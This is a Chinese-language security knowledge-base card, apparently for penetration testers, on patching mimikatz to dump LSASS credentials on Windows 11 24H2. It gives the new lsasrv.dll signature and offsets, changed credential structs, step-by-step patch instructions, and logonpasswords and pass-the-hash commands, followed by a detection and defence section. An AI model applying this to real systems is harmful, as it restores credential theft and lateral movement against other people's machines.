---
id: code-analysis-reverse-windows-mimikatz-24h2-lsasrv-offset-struct-adaptation
title: mimikatz 适配 Windows 11 24H2：lsasrv.dll LogonSessionList 签名/偏移与 KIWI_MSV1_0_LIST/MSV1_0_PRIMARY_CREDENTIAL 结构体变更
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: mimikatz-24h2-lsasrv-offset-struct-adaptation
tags:
- windows
- windows-11-24h2
- mimikatz
- lsass
- lsasrv
- reverse-engineering
- signature-scanning
- struct-offset
- credential-dumping
- pass-the-hash
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: Windows 11 24H2（build 26100）；mimikatz 2.2.0
verification:
  verified_by: verifier-V205
  verified_at: '2026-11-07T02:45:35+08:00'
  notes: 已对照原文与图片01-16核对：24H2 错误、pypykatz correction=34、RIP 相对替代签名 {58,-4}、KIWI_MSV1_0_LIST_65 与 MSV1_0_PRIMARY_CREDENTIAL_11_H24 一致；已修正 pack(push,2) 仅覆盖 isoSize/DPAPIProtected/align3；PoC 未在本库复跑。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-mimikatz-24h2-lsasrv-offset-struct-adaptation/
draft: false
kb_aliases:
- mimikatz 24H2
- mimikatz Windows 11 不兼容
- LogonSessionList 签名
- KIWI_MSV1_0_LIST_65
- MSV1_0_PRIMARY_CREDENTIAL_11_H24
- sekurlsa acquireLSA Logon list
- first_entry_offset_correction
---

## 一句话结论

Windows 11 24H2 的 `lsasrv.dll` 把 `LogonSessionList` 的引用从 RIP 相对寻址改成 `r13 + 偏移`（`r13 = __ImageBase`），并改动了 `KIWI_MSV1_0_LIST` 与 `MSV1_0_PRIMARY_CREDENTIAL` 结构体；mimikatz 2.2.0 因此报 `ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list` 和 `memory handle is not KULL_M_MEMORY_TYPE_PROCESS`。通过新增 24H2 构建号（26100）、改用 lsasrv.dll 中另一处仍为 RIP 相对的签名/偏移，并按 pypykatz 的 24H2 结构体补齐字段与版本选择，可恢复 `sekurlsa::logonpasswords` 与 `sekurlsa::pth`。

## 原理

- mimikatz 的 `sekurlsa` 先在 `lsasrv.dll` 中按特征码定位 `LogonSessionList` 与 `LogonSessionListCount` 两个全局变量，再按偏移读取链表头并遍历 `KIWI_MSV1_0_LIST`，最后按各结构体偏移取出用户名、域名、LM/NTLM/SHA1 凭据。
- 旧版 Windows 的引用形如 `mov r8d, [rip+0x16311a]` / `lea rcx, [rip+0x18b0b9]`，目标地址算法为“当前指令地址 + 指令长度 + 偏移”，mimikatz 的 `KULL_M_PATCH_GENERIC` 用 `{offset1, offset2}` 即可计算。
- 24H2 改为 `lea rdx, [r13+0x1932b0]`，而 `r13` 由 `lea r13, __ImageBase` 赋值。pypykatz 为此新增 `template.first_entry_offset_correction = 34`：先按 RIP 相对算出基址，再从指令附近偏移 34 处读取 4 字节附加偏移，两者相加得到 `LogonSessionList` 地址（`decrypter.py` 中的 `additional_offset` 逻辑）。
- 作者没有在 mimikatz 中完整实现 r13 追踪，而是寻找 `lsasrv.dll` 中另一处仍使用 RIP 相对的 `LogonSessionList` 引用（`mov ecx, [rip+...]; lea rcx, [rip+...]`），提取签名 `33 D2 48 F7 F1 8B DA 48 8D 04 5B 48 C1 E0 05`，并新增 `KULL_M_WIN_BUILD_11_24H2`（26100）条目，偏移 `{58, -4}`。
- 修复签名后不再报 `Logon list`，但输出大量 `n.e. (KIWI_MSV1_0_CREDENTIALS KO)`：链表找到了，结构体偏移不对。24H2 的 `KIWI_MSV1_0_LIST_65` 在 `UserName` 之前新增了两个指针字段（pypykatz 注释为 `unkXX # yaaaaay! something new!!!` 与 `unkXX2`），必须在 mimikatz 中新增对应结构并按 build number 选择，否则后续字段全部错位。
- 凭据仍不正确，是因为 `MSV1_0_PRIMARY_CREDENTIAL` 也变了：24H2 版本新增 `pNtlmCredIsoInProc`、`isIso`、`isNtOwfPassword`、`isLmOwfPassword`、`isShaOwfPassword`、`isDPAPIProtected`、`align0-2`、`isoSize`、`DPAPIProtected[]` 等字段，且需要 `#pragma pack(push, 2)` 对齐；新增 `_MSV1_0_PRIMARY_CREDENTIAL_11_H24` 并加入 helper 表后，提取与注入恢复正常。
- 边界：本文只解决 24H2 的格式/偏移问题，不绕过 PPL、Credential Guard、VBS 或杀软；这些防护启用时，LSASS 访问/离线 dump 仍会失败。Windows 构建更新后签名与结构体可能再次变化，需要重新适配。

## 触发条件

- 目标为 Windows 11 24H2（build 26100）；mimikatz 2.2.0 或未包含 24H2 适配的版本。
- 能访问 LSASS：本地管理员/SYSTEM 权限在线读取，或拿到可离线解析的 minidump；若 PPL/Credential Guard/VBS 启用，还需先绕过这些防护（不在本卡范围）。
- 具备逆向与编译环境（IDA/Ghidra、Visual Studio x64 或 MinGW），能修改并重编译 mimikatz。
- 失败现象可稳定复现：`sekurlsa::logonpasswords` 报 `ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list`；`sekurlsa::pth` 报 `memory handle is not KULL_M_MEMORY_TYPE_PROCESS`。

## 利用/实施步骤

1. 复现：在 24H2 上执行 `sekurlsa::minidump <dump>` + `sekurlsa::logonpasswords`，确认 `Logon list` 错误；再测 `sekurlsa::pth`，确认 `memory handle is not KULL_M_MEMORY_TYPE_PROCESS`。
2. 排除安全防护：对 LSASS 做 minidump 后离线解密仍报错，说明不是 PPL/VBS/Credential Guard 单独导致（至少不仅是），继续从格式/偏移入手。
3. 用 pypykatz 解析同一个 24H2 dump，确认其可正常提取；阅读 `msv/templates.py` 的 24H2 分支（`first_entry_offset=25`、`offset2=-16`、`first_entry_offset_correction=34`）与 `decrypter.py` 的附加偏移读取逻辑。
4. 在 IDA 中分析 `lsasrv.dll`：确认新代码用 `lea rdx, [r13+0x1932b0]` 且 `r13 = __ImageBase`；再寻找仍使用 RIP 相对的 `LogonSessionList` 引用（如 `mov ecx, [rip+0x18bf07]; lea rcx, [rip+0x18b0b9]`），提取签名与两个偏移。
5. 修改 mimikatz `kuhl_m_sekurlsa_utils.c`：新增 `KULL_M_WIN_BUILD_11_24H2`（26100）与 `PTRN_WN11_24H2_LogonSessionList`，在 `KULL_M_PATCH_GENERIC LsaSrvReferences[]` 中加入 `{58, -4}` 条目。
6. 编译并运行，确认不再报 `Logon list`；若输出大量 `n.e. (KIWI_MSV1_0_CREDENTIALS KO)`，进入结构体修复。
7. 按 pypykatz `KIWI_MSV1_0_LIST_65` 在 mimikatz 中新增 `_KIWI_MSV1_0_LIST_65`（在 `UserName` 前加 `unkXX`/`unkXX2` 两个指针字段），并在 `kuhl_m_sekurlsa.c` 按 build number 选择该结构。
8. 按 pypykatz `MSV1_0_PRIMARY_CREDENTIAL_11_H24` 新增 `_MSV1_0_PRIMARY_CREDENTIAL_11_H24`（新增 `pNtlmCredIsoInProc`、`isIso`、`isNtOwfPassword` 等字段，`#pragma pack(push,2)`），在 `kuhl_m_sekurlsa_msv1_0.c` 的 `msv1_0_primaryHelper[]` 中加入 24H2 条目，并在 `kuhl_m_sekurlsa_msv_helper()` 按 build number 选择。
9. 重新编译，在 24H2 上验证 `sekurlsa::logonpasswords` 输出正确凭据，`sekurlsa::pth` 能注入指定进程；若仍错位，用调试器逐字段对照 pypykatz 的读取顺序。

## PoC

签名与 patch 表（原文代码，节选）：

```c
#define KULL_M_WIN_BUILD_11_24H2 26100

BYTE PTRN_WN11_24H2_LogonSessionList[] = {
    0x33, 0xD2, 0x48, 0xF7, 0xF1, 0x8B, 0xDA,
    0x48, 0x8D, 0x04, 0x5B, 0x48, 0xC1, 0xE0, 0x05
};

{KULL_M_WIN_BUILD_11_24H2,
 {sizeof(PTRN_WN11_24H2_LogonSessionList), PTRN_WN11_24H2_LogonSessionList},
 {0, NULL}, {58, -4}},
```

24H2 结构体骨架（按 pypykatz 对应结构补字段，节选）：

```c
typedef struct _KIWI_MSV1_0_LIST_65 {
    struct _KIWI_MSV1_0_LIST_65* Flink;
    struct _KIWI_MSV1_0_LIST_65* Blink;
    /* ... 原有字段 ... */
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    BYTE waza[12];
    PVOID unkXX;    // 24H2 新增
    PVOID unkXX2;   // 24H2 新增
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    /* ... */
} KIWI_MSV1_0_LIST_65;

typedef struct _MSV1_0_PRIMARY_CREDENTIAL_11_H24 {
    LSA_UNICODE_STRING LogonDomainName;
    LSA_UNICODE_STRING UserName;
    PVOID pNtlmCredIsoInProc;
    BOOLEAN isIso;
    BOOLEAN isNtOwfPassword;
    BOOLEAN isLmOwfPassword;
    BOOLEAN isShaOwfPassword;
    BOOLEAN isDPAPIProtected;
    BYTE align0, align1, align2;
    //DWORD unkD; // 1/2
#pragma pack(push, 2)
    WORD isoSize;
    BYTE DPAPIProtected[LM_NTLM_HASH_LENGTH];
    DWORD align3;
    BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
    BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
    BYTE ShaOwfPassword[SHA_DIGEST_LENGTH];
} MSV1_0_PRIMARY_CREDENTIAL_11_H24;
#pragma pack(pop)
```

验证命令：

```text
mimikatz # sekurlsa::minidump <24H2.dmp>
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:administrator /domain:. /ntlm:<hash> "/run:mstsc.exe /restrictedadmin"
```

原图显示修复后 24H2 上 `logonPasswords` 正常输出 `Authentication Id` 与凭据；本卡未在本库复跑，构建号/偏移需按具体补丁版本核对。

## 变体与关联

- 追踪方式变体：完整实现 r13 基址追踪 + `first_entry_offset_correction`（pypykatz 做法）；或像本文一样寻找另一处仍用 RIP 相对的引用，直接复用旧偏移算法。
- 工具变体：pypykatz（纯 Python，已支持 24H2）、mimikatz 社区 fork、其他 LSASS 解析器；结构体字段名可能不同，需按读取顺序对齐。
- 关联卡：[[pentest-ad-lsass-minidump-pypykatz-offline]]（pypykatz 离线解析 LSASS dump 并 PTH）、[[pentest-lateral-movement-windows-rdp-browser-password-reuse-psexec]]（mimikatz 抓 NTLM → RDP/口令复用）、[[pentest-ad-mimikatz-dpapi-masterkey-saved-rdp-credential]]（mimikatz DPAPI）。
- 边界：本卡不涉及 PPL/Credential Guard/VBS 绕过；这些防护开启时需先参考对应绕过卡。Windows 更新后签名可能失效，结构体偏移也可能再次变化。

## 检测与防御

- 检测：LSASS 进程句柄打开（`PROCESS_VM_READ`/`PROCESS_QUERY_INFORMATION`）、minidump 文件创建、`sekurlsa`/`lsasrv` 相关字符串、异常调试权限（`SeDebugPrivilege`）；PTH 后的异常登录（同一 NTLM 哈希、非交互式 RDP/SMB）。
- 检测：监控 mimikatz 已知签名与改版二进制（字符串、导入、PDB/版本信息可能变化），行为检测优先于静态签名。
- 防御：启用 LSA Protection（PPL）、Credential Guard/VBS、限制本地管理员与 SeDebugPrivilege、开启 LSASS 访问审计；及时更新 Windows 与 EDR 规则。
- 防御：不要把“mimikatz 报错”当作安全；攻击者可像本文一样适配新构建。凭据保护应依赖隔离（Credential Guard）与最小权限，而不是工具兼容性。
- 响应：发现 LSASS 访问/minidump 立即隔离主机、重置该主机登录过的账号口令、轮换哈希可被 PTH 的账户，并排查横向移动。
